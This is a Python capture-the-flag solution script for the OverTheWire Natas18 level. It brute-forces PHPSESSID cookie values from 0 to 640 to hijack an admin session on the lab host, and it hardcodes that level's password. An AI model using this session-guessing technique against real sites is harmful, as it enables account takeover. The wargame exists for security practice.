#After reading the source code of website ,i come into idea to bruteforce cookie of the website.
#which is relate to some specific session i.e admin if $_COOKIE['PHPSESSID']==some integer value b/w 1 to 640 and then $_SESSION['admin']==1 ,then credentials will come.
#the main motive of this script is not disclose the solution of this challenge.
#i made this script to practice my scripting and webapplication security skills.
#!/usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth
import sys
from bs4 import BeautifulSoup
from time import *

def get_response(url,auth,data,cookie):
	try:
		req = requests.post(url,auth=auth,data=data,cookies=cookie)
		if req.status_code==200:
			webpage = BeautifulSoup(req.text,"lxml")
			data_web=webpage.find("div",{"id":"content"})
			return data_web.text
	except Exception as e:
		print(e)	

def send_request(url,auth):
	i = 0
	while i<641:
		data = "%d"%i
		cook = {"PHPSESSID":data}
		data_para = {"username":"admin","password":"password"}
		print("[*]Trying %d" % i,end="\t")
		response=get_response(url,auth,data_para,cook)
		if(response.find("You are an admin.")> -1):
			print("[+]Attempt Successfull")
			print("\t\t%s"%response)
			break
		print("[-]Not found!")	
		i=i+1

if __name__=="__main__":
	print("")
	print("Natas18-19 Session Id bruteforcer.")
	print("\t\t--written by krn_bhargav")
	sleep(4)
	print("")
	url = "http://natas18.natas.labs.overthewire.org/index.php"
	authent = HTTPBasicAuth("natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
	send_request(url,authent)